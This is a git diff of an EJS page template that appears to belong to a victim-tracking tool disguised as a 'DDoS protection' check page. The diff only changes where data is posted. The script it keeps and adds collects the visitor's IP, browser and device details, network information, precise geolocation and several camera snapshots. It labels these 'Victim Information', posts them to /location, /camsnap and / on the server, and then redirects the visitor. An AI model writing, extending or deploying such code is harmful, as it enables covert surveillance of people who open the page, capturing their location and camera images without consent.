@@ -73,18 +73,12 @@ DDoS protection by
 <script type="text/javascript">
 var c=false,l=false,uid="<%=uid %>";
 async function gather(){
-var td="";
-<% if(!t){ %>
-td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
-<% }else{ %>
-await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
-
-<% } %>
+var td = '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
 
 td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
 var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
 var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
-///INITIALSo
+///INITIALS
 td+="<br><b>📱 Device Information</b><br>";
 for(var i=0;i < xo.length;i++){ 
 if(xo[i] in navigator){
@@ -147,7 +141,7 @@ l=true;
 
 function success(pos) {
 const crd = pos.coords;
-$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
+$.post("/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
 l=true;
 red();
 });
@@ -171,7 +165,7 @@ const canvas = document.getElementById('canvas');
 var imgsent=0;
 
 function post(o){
-$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
+$.post("/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
 imgsent+=1;
 if(imgsent==4){
 c=true;
@@ -216,7 +210,7 @@ window.location.href="<%=url %>"
 }
 
 
-$.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
+$.post("/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
 
 }
 
